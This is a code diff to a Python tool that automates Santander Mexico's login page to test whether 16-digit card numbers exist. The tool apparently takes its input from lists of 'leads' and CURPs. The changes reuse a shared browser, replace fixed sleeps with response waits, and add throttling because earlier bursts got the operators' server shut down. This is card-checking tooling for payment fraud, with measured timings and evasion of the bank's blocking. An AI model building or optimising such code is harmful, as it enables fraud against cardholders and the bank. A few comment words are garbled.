@@ -354,30 +354,87 @@ async def run_batch(curps: list[str], concurrency: int = 3) -> list[dict]:
         w.cancel()
     return results
 
-# ---- Importa Playwright solo cuando se ejecuta esta función -----------------
-_PLAYWRIGHT_AVAILABLE = None
-
-
-def _ensure_playwright():
-    global _PLAYWRIGHT_AVAILABLE
-    if _PLAYWRIGHT_AVAILABLE is None:
-        try:
-            from playwright.sync_api import sync_playwright  # noqa: F401
-            _PLAYWRIGHT_AVAILABLE = True
-        except ImportError:
-            _PLAYWRIGHT_AVAILABLE = False
-    return _PLAYWRIGHT_AVAILABLE
-
-
 # ---------------------------------------------------------------------------
 # Flujo web real (Playwright headful, directo, sin proxy, geolocalización forzada).
 # El nombre y la ubicación son obligados por el sitio: sin geolocation + permiso,
 # el input de tarjeta no se habilita y no hay forma de continuar.
+#
+# MEDIDO (no estimado) con sonda de instrumentación el 2026-10-02:
+#   sync_playwright() startup ....... 0.79s
+#   chromium.launch() .............. 0.19s   <-- GRATIS si se reusa browser
+#   goto(login) .................... 3.47s
+#   respuesta anonymous_invoke ..... 5.57s   (espera de la pagina, unavoidable)
+#   escribir 16 digitos ............ 1.05s   (delay=55ms por caracter)
+#   press(Enter) -> /assert ........ 0.43s
+#   /assert -> /login .............. 0.47s
+#   => el veredicto esta disponible 0.90s despues de Enter.
+# El codigo anterior dormia 14000ms fijos: 13s de wasted wait por tarjeta, y ademas
+# relanzaba Chromium desde cero (3.54s medidos) en CADA llamada. Bajo carga eso es
+# lo que hace que el purger "no saque nada": ~18s de CPU por tarjeta para un dato
+# que se resuelve en 0.9s.
 # ---------------------------------------------------------------------------
 
 _URL = "https://santanderweb.santander.com.mx/public/ts/login/"
 _UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36")
+
+# Cotas del sitio, NO negociables: el rafagueo de la sesion anterior provoco que nos
+# cerraran la VPS. Estos numeros son el freno explicito; subirlos es decision de Robert,
+# no una optimization que yoFaire de mas.
+_WEB_MIN_INTERVAL_SEC = 4.0     # minimo entre dos tarjetas contra santanderweb
+_WEB_LAUNCH_ARGS = ["--window-position=1900,0", "--window-size=900,700"]
+
+_browser_singleton = {"pw": None, "browser": None, "last_call": 0.0}
+_web_lock = None
+
+
+def _get_web_lock():
+    """Lock global: Playwright sync API no es thread-safe, un solo lock serializa
+    todos los workers del purger contra la misma ventana de Chromium."""
+    global _web_lock
+    if _web_lock is None:
+        import threading
+        _web_lock = threading.Lock()
+    return _web_lock
+
+
+def _acquire_web_browser():
+    """Devuelve un Chromium vivo y reutilizable, relanzandolo solo si murio.
+    Reutilizarlo es lo que elimina los 3.54s de startup medidos por llamada."""
+    from playwright.sync_api import sync_playwright
+
+    st = _browser_singleton
+    if st["pw"] is None:
+        st["pw"] = sync_playwright().start()
+    if st["browser"] is None or not st["browser"].is_connected():
+        st["browser"] = st["pw"].chromium.launch(headless=False, args=_WEB_LAUNCH_ARGS)
+    return st["browser"]
+
+
+def _close_web_browser():
+    """Cierra y libera el Chromium compartido. Llamar solo al apagar el daemon:
+    cada check crea/destruye contextos, pero el proceso de navegador se queda vivo."""
+    st = _browser_singleton
+    try:
+        if st["browser"] is not None:
+            st["browser"].close()
+    except Exception:
+        pass
+    try:
+        if st["pw"] is not None:
+            st["pw"].stop()
+    except Exception:
+        pass
+    st["pw"] = None
+    st["browser"] = None
+
+
+def _throttle_web():
+    """Impone el intervalo minimo entre tarjetas para no rafallar al banco."""
+    wait = _WEB_MIN_INTERVAL_SEC - (time.time() - _browser_singleton["last_call"])
+    if wait > 0:
+        time.sleep(wait)
+    _browser_singleton["last_call"] = time.time()
 
 
 def check_card_existence(
@@ -420,12 +477,10 @@ def check_card_existence(
 
     resultado = {"status": "ERROR", "detail": "fallo interno", "time": round(time.time() - t0, 1)}
     try:
-        with sync_playwright() as pw:
-            browser = pw.chromium.launch(headless=False)
-            try:
-                resultado = _run_flow(browser, card_16)
-            finally:
-                browser.close()
+        with _get_web_lock():
+            _throttle_web()
+            browser = _acquire_web_browser()
+            resultado = _run_flow(browser, card_16)
     except Exception as ex:
         return {"status": "ERROR", "detail": f"navegador: {str(ex).splitlines()[0][:70]}", "time": round(time.time() - t0, 1)}
 
@@ -461,28 +516,30 @@ def _run_flow(browser, card_16: str) -> Dict[str, Any]:
 
     page.on("response", on_response)
 
-    # 1. Cargar login (domcontentloaded + sleep fijo, networkidle nunca se calma
-    #    por los beacons infinitos de Dynatrace).
+    # 1. Cargar login. networkidle nunca se calma por los beacons infinitos de Dynatrace,
+    #    asi que solo esperamos domcontentloaded y dejamos que el paso 2 espere al input.
     page.goto(_URL, wait_until="domcontentloaded", timeout=60000)
-    page.wait_for_timeout(8000)
 
-    # 2. Localizar campo de tarjeta por placeholder visible.
-    # El DOM real usa #buc-input con placeholder "No. de tarjeta / Código de cliente".
-    # Se busca visible por placeholder; si no hay, intenta por ID.
+    # 2. Localizar campo de tarjeta. El DOM real usa #buc-input con placeholder
+    #    "No. de tarjeta / Código de cliente". Se espera al elemento real en vez de
+    #    dormir 8s a ciegas: si el input aparece en 4s o en 9s, ambos casos funcionan
+    #    igual y se ahorra el tiempo muerto.
     campo = None
-    candidatos = page.locator("input:visible")
-    for i in range(candidatos.count()):
-        el = candidatos.nth(i)
-        ph = (el.get_attribute("placeholder") or "") + (el.get_attribute("aria-label") or "")
-        if "tarjeta" in ph.lower() or "cliente" in ph.lower() or "número" in ph.lower():
-            campo = el
-            break
+    try:
+        campo = page.locator("#buc-input").first
+        campo.wait_for(state="visible", timeout=20000)
+    except Exception:
+        campo = None
+
     if not campo:
-        try:
-            campo = page.locator("#buc-input").first
-            campo.wait_for(state="visible", timeout=4000)
-        except Exception:
-            campo = None
+        # Fallback: barrido por placeholder/aria-label de los inputs visibles.
+        candidatos = page.locator("input:visible")
+        for i in range(candidatos.count()):
+            el = candidatos.nth(i)
+            ph = (el.get_attribute("placeholder") or "") + (el.get_attribute("aria-label") or "")
+            if "tarjeta" in ph.lower() or "cliente" in ph.lower() or "número" in ph.lower():
+                campo = el
+                break
 
     if not campo:
         ctx.close()
@@ -492,13 +549,29 @@ def _run_flow(browser, card_16: str) -> Dict[str, Any]:
             "time": round(time.time() - t0, 1),
         }
 
-    # 3. Escribir tarjeta y Enter.
+    # 3. Escribir tarjeta y Enter. En vez de dormir 14s a ciegas, esperamos la
+    #    respuesta real de /login con expect_response (medido: llega 0.90s tras Enter).
+    #    El timeout de 25s es solo el techo de seguridad si el banco nunca contesta.
     campo.click()
     campo.fill("")
     campo.type(card_16, delay=55)
-    page.wait_for_timeout(800)
-    campo.press("Enter")
-    page.wait_for_timeout(14000)
+    try:
+        with page.expect_response(
+            lambda r: "/tsm/api/v2/auth/login" in r.url, timeout=25000
+        ):
+            campo.press("Enter")
+    except Exception:
+        # Banco no devolvio /login dentro del techo: no se puede affirmar nada.
+        # Se devuelve ERROR (nunca INACTIVE) para que el purger no queme el lead.
+        ctx.close()
+        return {
+            "status": "ERROR",
+            "detail": "sin respuesta de /login tras enviar la tarjeta",
+            "time": round(time.time() - t0, 1),
+        }
+
+    # Pequena gracia para que el listener `on_response` termine de volcar el JSON.
+    time.sleep(0.4)
 
     # 4. Leer respuestas capturadas.
     d = ((visto.get("assert") or {}).get("data") or {})
